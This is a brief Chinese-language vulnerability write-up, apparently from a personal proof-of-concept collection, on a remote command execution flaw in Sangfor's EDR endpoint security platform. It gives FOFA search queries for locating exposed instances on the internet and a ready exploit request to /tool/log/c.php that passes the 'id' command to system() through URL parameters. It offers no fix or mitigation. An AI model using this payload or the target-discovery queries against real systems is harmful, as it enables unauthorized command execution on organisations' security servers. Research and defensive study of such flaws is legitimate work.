# 深信服EDR平台存在远程命令执行漏洞

# 一、漏洞简介
 深信服终端检测响应平台EDR,通过云网端联动协同、威胁情报共享、多层级响应机制,帮助用户快速处置终端安全问题,构建轻量级、智能化、响应快的下一代终端安全系统。深信服终端监测响应平台（EDR）存在远程命令执行漏洞。

# 二、影响版本
+ 深信服EDR

# 三、资产测绘
+ fofa`<font style="color:rgba(0, 0, 0, 0.9);">app="SANGFOR-EDR"</font>``<font style="color:rgba(0, 0, 0, 0.9);">title="终端检测响应平台"</font>`

![1716179568863-6a3ef6e1-44be-4250-a0b9-6e869186adc6.png](./img/SSNDnO_IRu30np4k/1716179568863-6a3ef6e1-44be-4250-a0b9-6e869186adc6-578437.png)

# 四、漏洞复现
```plain
/tool/log/c.php?strip_slashes=system&host=id
```

![1716179905089-bcaa2ab3-5127-42cb-8f89-09f79a843007.png](./img/SSNDnO_IRu30np4k/1716179905089-bcaa2ab3-5127-42cb-8f89-09f79a843007-377633.png)



> 更新: 2024-05-23 13:32:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bw1hyzgtaebgmp4x>